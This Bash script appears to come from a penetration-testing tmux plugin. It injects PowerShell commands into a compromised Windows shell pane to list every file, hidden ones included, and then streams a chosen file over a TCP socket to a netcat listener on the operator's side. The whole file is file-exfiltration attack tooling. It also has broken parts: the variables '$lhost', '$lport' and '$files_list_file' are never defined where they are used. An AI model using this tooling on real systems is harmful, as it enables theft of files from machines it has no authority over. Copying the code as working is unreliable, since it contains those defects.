#!/usr/bin/env bash

_CMD_CURRENT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
_PENMUX_SCRIPTS=""
_MODULE_PATH=""

_windows_path_to_unix() {
  local path="$1"
  path="$(echo "$path" | sed 's/\\/\//g' | sed 's/://g')"

  echo "$path"
}

_fetch_file() {
  local pane_id="$1"
  local src="$2"
  local dst="$3"
  local lport="$4"
  local dst_dir="$(dirname "$dst")"
  local nc_window

  if [[ ! -d "$dst_dir" ]]; then
    mkdir -p "$dst_dir" || return
  fi

  nc_window="$(tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst\"")"

  tmux send-keys -t "$pane_id" "\$FileName = '$src'" Enter
  tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
  tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
  tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
  tmux send-keys -t "$pane_id" '$Stream = $TcpClient.GetStream()' Enter
  tmux send-keys -t "$pane_id" 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
  tmux send-keys -t "$pane_id" '$FileStream.Close()' Enter
  tmux send-keys -t "$pane_id" '$Stream.Dispose()' Enter
  tmux send-keys -t "$pane_id" '$TcpClient.Dispose()' Enter

  while true; do
    tmux has-session -t "$nc_window" >/dev/null 2>&1 || break
    sleep 1
  done
}

_list_files() {
  local pane_id="$1"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
  local files="$(mktemp)"

  tmux send-keys -t "$pane_id" '$FileName = Get-ChildItem $TEMP\fl.txt | Select Name -ExpandProperty FullName' Enter
  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName > $FileName' Enter
  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName >> $FileName' Enter

  _fetch_file "$pane_id" '$TEMP\fl.txt' "$files" "$lport"

  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(cat "$files_list_file" | fzf --cycle --border="sharp")"
  rm "$files"
}

_run() {
  local pane_id="$1"
  tmux display-popup -w 80% -h 80% -E "$_CMD_CURRENT_DIR/powershell_fetch_socket.sh -a list_files -c \"$_PENMUX_SCRIPTS\" -m \"$_MODULE_PATH\" -p \"$pane_id\""
  local file_to_fetch="$(tmux show-options -t "$pane_id" -pqv "@penmux-commander-pfs-hidden-file")"
  tmux set-option -pu "@penmux-commander-pfs-hidden-file"

  if [[ -z "$file_to_fetch" ]]; then
    file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
  else
#    file_to_fetch="$(echo "$file_to_fetch" | sed 's/\\/\\\\/g')"
#    file_to_fetch="$(echo "$file_to_fetch" | sed 's/C:/C\:/g')"
    file_to_fetch="${file_to_fetch:2:-1}"
  fi

  [[ -z "$file_to_fetch" ]] && return

  local dst_file="$(_windows_path_to_unix "${file_to_fetch}")"
  dst_file="###SessionDir###Files/${file_to_fetch}"
  dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
  dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"

  _fetch_file "$pane_id" "$file_to_fetch" "$dst_file" "$lport"
}

main() {
  local action
  local pane_id

  pane_id="$(tmux display-message -p "#D")"

  local OPTIND o
  while getopts "a:c:m:p:f:l:s:" o; do
    case "${o}" in
      a)
        action="${OPTARG}"
        ;;
      c)
        _PENMUX_SCRIPTS="${OPTARG}"
        ;;
      m)
        _MODULE_PATH="${OPTARG}"
        ;;
      p)
        pane_id="${OPTARG}"
        ;;
      *)
        echo >&2 "Invalid parameter"
        exit 1
        ;;
    esac
  done

  source "$_PENMUX_SCRIPTS/exported.sh"

  # if supported_tmux_version_ok; then
  case "${action}" in
    "run")
      _run "$pane_id"
      exit 0
      ;;
    "list_files")
      _list_files "$pane_id"
      exit 0
      ;;
    *)
      tmux display-message -d 5000 "Error: 'Invalid action ${action}'"
      exit 0
      ;;
  esac
  # fi
}
main "$@"
